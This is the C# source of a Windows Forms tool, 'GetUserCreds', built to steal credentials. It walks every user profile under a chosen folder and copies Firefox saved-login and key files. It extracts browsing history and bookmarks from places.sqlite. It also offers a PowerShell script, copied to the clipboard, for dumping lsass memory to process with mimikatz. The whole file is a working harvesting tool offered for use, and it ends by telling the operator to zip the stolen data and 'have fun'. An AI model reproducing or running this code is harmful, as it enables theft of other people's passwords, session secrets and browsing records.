using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace GetUserCreds
{
    public partial class TakeCreds : Form
    {
        //0: Base Folder
        //1: Username
        //2: Your Special
        //3: AppData
        string ComplexFormat = "{0}\\{1}\\{2}\\{3}";
        //0:Base Folder
        //1: Username
        //2: AppData
        string SimpleFormat = "{0}\\{1}\\{2}";
        string exploitlocation = "AppData\\Roaming\\Mozilla\\Firefox\\Profiles";
        string profilelocation = "AppData\\Roaming\\Mozilla\\Firefox";

        private static IList<string> AllBookMarks { get; set; }
        private static IList<string> AllHistory { get; set; }

        const string loginsjson = "logins.json";
        const string key3db = "key3.db";
        const string signonssqlite = "signons.sqlite";
        const string cert8db = "cert8.db";
        const string placessqlite = "places.sqlite";
        const string profilesini = "profiles.ini";

        const string allUrlsTxt = "allurls.txt";
        const string bookmarkstxt = "bookmarks.txt";

        public TakeCreds()
        {
            InitializeComponent();
        }

        private void GetSource_Click(object sender, EventArgs e)
        {
            using (FolderBrowserDialog d = new FolderBrowserDialog())
            {
                d.Description = "Select a folder";
                if (DialogResult.OK == d.ShowDialog())
                {
                    source.Text = d.SelectedPath;
                }
            }
        }

        private void GetDest_Click(object sender, EventArgs e)
        {
            using (FolderBrowserDialog d = new FolderBrowserDialog())
            {
                d.Description = "Select a folder";
                if (DialogResult.OK == d.ShowDialog())
                {
                    destination.Text = d.SelectedPath;
                }
            }
        }

        private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.SelectedIndex == 1)
            {
                specialfolder.Enabled = true;
            }
            else
            {
                specialfolder.Enabled = false;
                specialfolder.Text = string.Empty;
            }
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Source - " + GetSourcePath());
            sb.AppendLine("Destination - " + GetDestinationPath());

            DialogResult dlg = MessageBox.Show(sb.ToString(), "Are you sure you want to take credentials, history and bookmarks?", MessageBoxButtons.OKCancel);
            if (DialogResult.OK == dlg)
            {
                TakeOverIt();
            }
        }

        private static void AddToList(string site)
        {
            if (null == AllBookMarks)
                AllBookMarks = new List<string>();
            var count = AllBookMarks.Where(x => x == site).Count();
            if (0 == count)
                AllBookMarks.Add(site);
        }

        private static void AddHistoryItem(string site)
        {
            if (null == AllHistory)
                AllHistory = new List<string>();
            var count = AllHistory.Where(x => x == site).Count();
            if (0 == count)
                AllHistory.Add(site);
        }

        private void TakeOverIt()
        {
            DirectoryInfo di = new DirectoryInfo(source.Text);
            DirectoryInfo diPlace = new DirectoryInfo(destination.Text);
            DialogResult dr = MessageBox.Show("Do you want the script copied to your clipboard to process a mini dump of lsass?" +Environment.NewLine + Environment.NewLine +
                "If so, when you click yes, the powershell script will be copied to your clipboard." + 
                ">> Run cmd.exe as an administrator" + Environment.NewLine +
                ">> type powershell and hit enter" + Environment.NewLine +
                ">> right click and paste the script" + Environment.NewLine + 
                ">> use mimikatz to process the script locally on your machine after copying the file down (minidump).", 
                "Give me script!", MessageBoxButtons.YesNo);
            if (DialogResult.Yes == dr)
            {
                if (!Directory.Exists(diPlace.FullName))
                    Directory.CreateDirectory(diPlace.FullName);
               Clipboard.SetText(PShell.getMyPwShellString(diPlace.FullName));    
            }
            foreach (var d in di.GetDirectories())
            {
                string whereToGo = diPlace.FullName + "\\" + d.ToString();
                if (!Directory.Exists(whereToGo))
                    Directory.CreateDirectory(whereToGo);

                DirectoryInfo what = null;
                string l2 = string.Empty;
                if (IsSimple())
                {
                    string l = string.Format(SimpleFormat, di.FullName, d.Name, exploitlocation);
                    l2 = string.Format(SimpleFormat, di.FullName, d.Name, profilelocation);
                    what = new DirectoryInfo(l);
                }
                else
                {
                    string l = string.Format(ComplexFormat, di.FullName, d.Name, specialfolder.Text, exploitlocation);
                    l2 = string.Format(ComplexFormat, di.FullName, d.Name, specialfolder.Text, profilelocation);
                    what = new DirectoryInfo(l);
                }

                if (what.Exists)
                {
                    foreach (DirectoryInfo dl in what.GetDirectories())
                    {
                        string dlFullName = dl.FullName;
                        string file1ToGet = dlFullName + "\\" + loginsjson;
                        string file2ToGet = dlFullName + "\\" + key3db;
                        string file3ToGet = dlFullName + "\\" + signonssqlite;
                        string file4ToGet = dlFullName + "\\" + cert8db;
                        string file5ToGet = dlFullName + "\\" + placessqlite;
                        string profileFile = l2 + "\\" + profilesini;
                        string newpath = whereToGo + "\\" + dl.Name;
                        Directory.CreateDirectory(newpath);
                        //Copy profile.ini
                        if (File.Exists(file4ToGet))
                            File.Copy(file4ToGet, newpath + "\\" + cert8db);
                        if (File.Exists(profileFile))
                            File.Copy(profileFile, newpath + "\\" + profilesini);
                        DumpBookmarks(file5ToGet, newpath);
                        DumpHistory(file5ToGet, newpath);
                        //Copy Logins
                        if (File.Exists(file1ToGet))
                        {
                            File.Copy(file1ToGet, newpath + "\\" + loginsjson);
                            if (File.Exists(file2ToGet))
                                File.Copy(file2ToGet, newpath + "\\" + key3db);
                        }
                        //Copy sqlite
                        if (File.Exists(file3ToGet))
                        {
                            File.Copy(file3ToGet, newpath + "\\" + signonssqlite);
                            if (File.Exists(file2ToGet) && !File.Exists(newpath + "\\" + key3db))
                                File.Copy(file2ToGet, newpath + "\\" + key3db);
                        }
                    }
                }
            }
            SaveSimpleListUrl(diPlace.FullName);
            SaveSimpleListHistory(diPlace.FullName);
            PromptCompleteInstructions();
        }

        private static void PromptCompleteInstructions()
        {
            MessageBox.Show("Data gathering has completed." + Environment.NewLine +
                "Zip the folders/files up and copy down locally and have fun.");
        }

        private void SaveSimpleListUrl(string p)
        {
            if (null != AllBookMarks)
            {
                if (AllBookMarks.Count > 0)
                {
                    using (StreamWriter sw = new StreamWriter(p + "\\" + allUrlsTxt))
                    {
                        foreach (string s in AllBookMarks.ToList())
                        {
                            sw.WriteLine(s);
                        }
                    }
                }
            }
        }

        private static void DumpBookmarks(string file5ToGet, string newpath)
        {
            if (File.Exists(file5ToGet))
            {
                IList<string> bookmarks = new List<string>();
                String path_to_db = file5ToGet;
                using (SQLiteConnection sqlite_connection = new SQLiteConnection("Data Source=" + path_to_db +
                    ";Version=3;Compress=True;Read Only=True;"))
                {
                    using (SQLiteCommand sqlite_command = sqlite_connection.CreateCommand())
                    {
                        sqlite_connection.Open();
                        sqlite_command.CommandText = "SELECT moz_bookmarks.title,moz_places.url FROM moz_bookmarks " +
                            "LEFT JOIN moz_places WHERE moz_bookmarks.fk = moz_places.id " +
                            "AND moz_bookmarks.title != 'null'"; //Get everything not just '%http%' you might miss out
                        using (SQLiteDataReader sqlite_datareader = sqlite_command.ExecuteReader())
                        {
                            while (sqlite_datareader.Read())
                            {
                                try
                                {
                                    string bm = sqlite_datareader[1].ToString();
                                    if (!string.IsNullOrEmpty(bm))
                                        bookmarks.Add(bm);
                                }
                                catch { }
                            }
                            sqlite_connection.Close();
                        }
                    }
                }
                if (bookmarks.Count() > 0)
                {
                    string newfile = newpath + "\\" + bookmarkstxt;
                    if (!File.Exists(newfile))
                        File.Create(newfile).Dispose();
                    using (StreamWriter sw = new StreamWriter(newfile))
                    {
                        foreach (string s in bookmarks.ToList())
                        {
                            AddToList(s);
                            sw.WriteLine(s);
                        }
                    }
                }
            }
        }

        private static void DumpHistory(string file5ToGet, string newpath)
        {
            if (File.Exists(file5ToGet))
            {
                String path_to_db = file5ToGet;
                String path_to_temp = System.IO.Path.GetTempFileName();
                using (SQLiteConnection sqlite_connection = new SQLiteConnection("Data Source=" + path_to_db +
                    ";Version=3;Compress=True;Read Only=True;"))
                {
                    using (SQLiteCommand sqlite_command = sqlite_connection.CreateCommand())
                    {
                        sqlite_connection.Open();
                        sqlite_command.CommandText = "SELECT Distinct moz_places.url " +
                            "FROM moz_places, moz_historyvisits " +
                            "WHERE moz_places.id = moz_historyvisits.place_id";
                        using (SQLiteDataReader sqlite_datareader = sqlite_command.ExecuteReader())
                        {
                            while (sqlite_datareader.Read())
                            {
                                try
                                {
                                    string bm = sqlite_datareader[0].ToString();
                                    if (!string.IsNullOrEmpty(bm))
                                        AddHistoryItem(bm);
                                }
                                catch { }
                            }
                            sqlite_connection.Close();
                        }
                    }
                }
            }
        }

        private void SaveSimpleListHistory(string p)
        {
            if (null != AllHistory)
            {
                if (AllHistory.Count > 0)
                {
                    using (StreamWriter sw = new StreamWriter(p + "\\allHistory.txt"))
                    {
                        foreach (string s in AllHistory.ToList())
                        {
                            sw.WriteLine(s);
                        }
                    }
                }
            }
        }

        private bool CheckFileExists(string s)
        {
            if (File.Exists(s))
                return true;
            else
                return false;
        }

        private string GetSourcePath()
        {
            string f = string.Empty;
            if (IsSimple())
            {
                f = string.Format(SimpleFormat, source.Text, "USERNAME", exploitlocation);
            }
            else
            {
                f = string.Format(ComplexFormat, source.Text, "USERNAME", specialfolder.Text, exploitlocation);
            }
            return f;
        }


        private string GetDestinationPath()
        {
            return destination.Text;
        }

        private bool IsSimple()
        {
            if (comboBox1.SelectedIndex == 0)
                return true;
            else
                return false;
        }

        private void TakeCreds_Load(object sender, EventArgs e)
        {
        }
    }
}
